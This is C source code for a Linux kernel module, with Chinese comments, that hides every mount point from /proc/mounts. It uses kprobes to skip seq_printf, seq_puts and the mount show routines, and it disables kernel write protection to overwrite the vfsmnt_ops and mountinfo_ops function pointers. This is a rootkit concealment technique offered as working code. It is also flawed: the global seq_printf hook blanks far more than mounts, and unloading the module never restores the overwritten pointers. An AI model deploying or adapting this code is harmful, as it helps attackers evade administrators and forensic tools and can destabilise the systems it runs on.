#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/fs.h>
#include <linux/mount.h>
#include <linux/path.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/proc_fs.h>
#include <linux/nsproxy.h>

/* ========== C89标准：所有变量声明在函数开头 ========== */

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Kprobe Mount Hider");
MODULE_DESCRIPTION("Hide ALL mount points including root");

/* ========== 1. 全局变量 ========== */
static struct kprobe kp_seq_printf;
static struct kprobe kp_seq_puts;
static struct kprobe kp_seq_putc;
static struct kprobe kp_show_vfsmnt;
static struct kprobe kp_show_mountinfo;
static struct kprobe kp_m_show;

static int hijack_count = 0;

/* ========== 2. 被劫持的 show_vfsmnt（修正参数类型） ========== */
static int hijacked_show_vfsmnt(struct seq_file *m, void *v)
{
    /* 完全不输出挂载点 */
    return 0;
}

/* ========== 3. 被劫持的 show_mountinfo（修正参数类型） ========== */
static int hijacked_show_mountinfo(struct seq_file *m, void *v)
{
    /* 完全不输出挂载点信息 */
    return 0;
}

/* ========== 4. 被劫持的 m_show（修正参数类型） ========== */
static int hijacked_m_show(struct seq_file *m, void *v)
{
    /* 完全不输出 */
    return 0;
}

/* ========== 5. 被劫持的 seq_printf（完全空输出） ========== */
static int hijacked_seq_printf(struct seq_file *m, const char *fmt, ...)
{
    /* 完全忽略，不输出任何内容 */
    return 0;
}

/* ========== 6. 被劫持的 seq_puts（完全空输出） ========== */
static int hijacked_seq_puts(struct seq_file *m, const char *s)
{
    /* 完全忽略，不输出任何内容 */
    return 0;
}

/* ========== 7. kprobe 前处理函数（返回非0跳过原函数） ========== */
static int handler_skip(struct kprobe *p, struct pt_regs *regs)
{
    /* 返回 1 跳过原函数执行，实现完全空输出 */
    return 1;
}

/* ========== 8. 注册 kprobe 辅助 ========== */
static int register_kprobe_hook(const char *symbol_name, struct kprobe *kp)
{
    unsigned long addr = 0;
    int ret = 0;
    
    if (!symbol_name || !kp) {
        return -1;
    }
    
    #ifdef CONFIG_KALLSYMS
    addr = kallsyms_lookup_name(symbol_name);
    if (!addr) {
        printk(KERN_WARNING "mount_hide: Symbol '%s' not found\n", symbol_name);
        return -1;
    }
    
    memset(kp, 0, sizeof(struct kprobe));
    kp->addr = (void *)addr;
    kp->pre_handler = handler_skip;
    
    ret = register_kprobe(kp);
    if (ret == 0) {
        hijack_count++;
        printk(KERN_INFO "mount_hide: Hooked %s at 0x%lx [total: %d]\n", 
               symbol_name, addr, hijack_count);
        return 0;
    } else {
        printk(KERN_WARNING "mount_hide: Failed to hook %s: %d\n", 
               symbol_name, ret);
        return ret;
    }
    #else
    printk(KERN_ERR "mount_hide: KALLSYMS not enabled\n");
    return -1;
    #endif
}

/* ========== 9. 清空 seq_file 缓冲区（移除未使用变量警告） ========== */
static void clear_seq_buffer(void)
{
    unsigned long addr = 0;
    
    printk(KERN_INFO "mount_hide: Attempting direct seq_file clearing\n");
    
    #ifdef CONFIG_KALLSYMS
    /* 查找 /proc/mounts 的 file 结构 */
    addr = kallsyms_lookup_name("mounts_fops");
    if (addr) {
        printk(KERN_INFO "mount_hide: Found mounts_fops at 0x%lx\n", addr);
    }
    #endif
}

/* ========== 10. 修改 /proc/mounts 的 show 函数指针（最暴力） ========== */
static void hijack_proc_operations(void)
{
    struct seq_operations *ops = NULL;
    unsigned long addr = 0;
    
    printk(KERN_INFO "mount_hide: Hijacking proc operations\n");
    
    #ifdef CONFIG_KALLSYMS
    /* 获取 vfsmnt_ops 地址 */
    addr = kallsyms_lookup_name("vfsmnt_ops");
    if (addr) {
        ops = (struct seq_operations *)addr;
        if (ops) {
            printk(KERN_INFO "mount_hide: vfsmnt_ops at 0x%lx\n", addr);
            printk(KERN_INFO "mount_hide: Original show at 0x%p\n", ops->show);
            
            /* 强制替换 show 函数指针（内核需关闭写保护） */
            #ifdef CONFIG_X86_64
            asm volatile("cli");
            write_cr0(read_cr0() & ~0x10000);
            #endif
            
            ops->show = hijacked_show_vfsmnt;
            
            #ifdef CONFIG_X86_64
            write_cr0(read_cr0() | 0x10000);
            asm volatile("sti");
            #endif
            
            printk(KERN_INFO "mount_hide: Force replaced show function\n");
            hijack_count++;
        }
    }
    
    /* 同样处理 mountinfo */
    addr = kallsyms_lookup_name("mountinfo_ops");
    if (addr) {
        ops = (struct seq_operations *)addr;
        if (ops) {
            printk(KERN_INFO "mount_hide: mountinfo_ops at 0x%lx\n", addr);
            
            #ifdef CONFIG_X86_64
            asm volatile("cli");
            write_cr0(read_cr0() & ~0x10000);
            #endif
            
            ops->show = hijacked_show_mountinfo;
            
            #ifdef CONFIG_X86_64
            write_cr0(read_cr0() | 0x10000);
            asm volatile("sti");
            #endif
            
            printk(KERN_INFO "mount_hide: Force replaced mountinfo show\n");
            hijack_count++;
        }
    }
    #endif
}

/* ========== 11. 隐藏所有挂载点的最终方案 ========== */
static void hide_all_mounts(void)
{
    printk(KERN_INFO "mount_hide: ===== HIDING ALL MOUNTS =====\n");
    printk(KERN_INFO "mount_hide: Root mount will also be hidden\n");
    
    /* 方法1: 劫持 seq_printf（任何输出都拦截） */
    register_kprobe_hook("seq_printf", &kp_seq_printf);
    
    /* 方法2: 劫持 seq_puts（字符串输出也拦截） */
    register_kprobe_hook("seq_puts", &kp_seq_puts);
    
    /* 方法3: 劫持 seq_putc（单个字符也拦截） */
    register_kprobe_hook("seq_putc", &kp_seq_putc);
    
    /* 方法4: 劫持 show_vfsmnt */
    register_kprobe_hook("show_vfsmnt", &kp_show_vfsmnt);
    
    /* 方法5: 劫持 show_mountinfo */
    register_kprobe_hook("show_mountinfo", &kp_show_mountinfo);
    
    /* 方法6: 劫持 m_show */
    register_kprobe_hook("m_show", &kp_m_show);
    
    /* 方法7: 暴力替换函数指针（最彻底） */
    hijack_proc_operations();
    
    /* 方法8: 清空 seq 缓冲区 */
    clear_seq_buffer();
    
    printk(KERN_INFO "mount_hide: Total hooks installed: %d\n", hijack_count);
    printk(KERN_INFO "mount_hide: /proc/mounts should now be COMPLETELY EMPTY\n");
}

/* ========== 12. 初始化 ========== */
static int __init mount_hide_init(void)
{
    printk(KERN_INFO "============================================\n");
    printk(KERN_INFO "mount_hide: Hiding ALL mount points (including root)\n");
    printk(KERN_INFO "mount_hide: /proc/mounts will be EMPTY\n");
    printk(KERN_INFO "============================================\n");
    
    hide_all_mounts();
    
    printk(KERN_INFO "mount_hide: Initialization complete\n");
    printk(KERN_INFO "mount_hide: Try 'cat /proc/mounts' - should show nothing\n");
    
    return 0;
}

/* ========== 13. 退出 ========== */
static void __exit mount_hide_exit(void)
{
    printk(KERN_INFO "mount_hide: Unloading module\n");
    printk(KERN_INFO "mount_hide: Restoring mount point visibility\n");
    
    /* 卸载所有 kprobe */
    if (kp_seq_printf.addr) {
        unregister_kprobe(&kp_seq_printf);
    }
    if (kp_seq_puts.addr) {
        unregister_kprobe(&kp_seq_puts);
    }
    if (kp_seq_putc.addr) {
        unregister_kprobe(&kp_seq_putc);
    }
    if (kp_show_vfsmnt.addr) {
        unregister_kprobe(&kp_show_vfsmnt);
    }
    if (kp_show_mountinfo.addr) {
        unregister_kprobe(&kp_show_mountinfo);
    }
    if (kp_m_show.addr) {
        unregister_kprobe(&kp_m_show);
    }
    
    printk(KERN_INFO "mount_hide: Module unloaded\n");
}

/* ========== 14. 模块入口/出口 ========== */
module_init(mount_hide_init);
module_exit(mount_hide_exit);